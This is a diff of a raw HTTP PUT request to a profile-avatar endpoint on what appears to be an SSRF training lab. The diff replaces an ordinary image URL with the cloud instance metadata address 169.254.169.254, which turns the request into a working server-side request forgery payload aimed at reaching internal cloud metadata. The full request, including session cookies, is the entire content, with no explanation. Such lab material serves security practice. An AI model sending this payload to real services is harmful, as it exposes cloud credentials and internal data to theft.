@@ -1,7 +1,7 @@
 PUT /api-v1/api/user/update/avatar HTTP/2
 Host: ssrflab.dpdns.org
 Cookie: __Host-authjs.csrf-token=53ccfd223c0481e341d0aac3b3815d00feaad7a941245237671b93ec4f6f8455%7C4b182cccb28a28c9b6df50d05795b2509866ac79c3cfd7eed134e1a49f390db0; __Secure-authjs.callback-url=https%3A%2F%2Fssrflab.dpdns.org%2F
-Content-Length: 86
+Content-Length: 56
 Sec-Ch-Ua-Platform: "Windows"
 Accept-Language: en-US,en;q=0.9
 Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
@@ -18,4 +18,4 @@ Referer: https://ssrflab.dpdns.org/settings
 Accept-Encoding: gzip, deflate, br
 Priority: u=1, i
 
-{"profilePicture":"https://photo.znews.vn/w1200/Uploaded/mdf_eioxrd/2021_07_06/2.jpg"}
+{"profilePicture":"http://169.254.169.254/metadata/v1/"}
